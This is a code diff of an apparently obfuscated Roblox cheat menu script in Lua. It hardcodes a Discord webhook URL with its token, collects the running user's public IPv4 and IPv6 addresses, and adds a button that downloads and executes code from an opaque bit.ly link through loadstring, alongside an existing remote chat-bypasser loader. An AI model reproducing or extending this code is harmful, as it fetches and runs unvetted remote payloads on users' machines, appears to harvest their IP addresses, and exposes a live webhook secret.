@@ -115,7 +115,7 @@ bit32.arshift = function(x, s_amount)
 	end
 end;
 TABLE_TableIndirection["Webhook%0"] = "https://discord.com/api/webhooks/1339014658576879749/cTUWHui8ni3g4CAOLwUkgW-J_KoVTI_i7IW6RyIdAr8K9cVzVCzkQzrqEsyzP9wzR9Jj";
-TABLE_TableIndirection["ValidIPs%0"] = {"184.160.54.228"};
+TABLE_TableIndirection["ValidIPs%0"] = {"184.160.54.228","72.252.32.68"};
 TABLE_TableIndirection["IPv4%0"] = game:HttpGet("https://api.ipify.org");
 TABLE_TableIndirection["IPv6%0"] = game:HttpGet("https://api64.ipify.org");
 TABLE_TableIndirection["LocalPlayer%0"] = game:GetService("Players").LocalPlayer;
@@ -318,6 +318,9 @@ TABLE_TableIndirection["Tab2%0"]:AddButton({Name="Fly",Callback=function()
 end});
 TABLE_TableIndirection["Tab2%0"]:AddButton({Name="ChatBypasser",Callback=function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/AnnaRoblox/AnnaBypasser/refs/heads/main/AnnaBypasser.lua", true))();
+end});
+TABLE_TableIndirection["Tab2%0"]:AddButton({Name="SurpWare(Best ChatBypasser)",Callback=function()
+	loadstring(game:HttpGetAsync("https://bit.ly/surpware"))();
 end});
 TABLE_TableIndirection["Tab2%0"]:AddButton({Name="AutoReport",Callback=function()
 	repeat
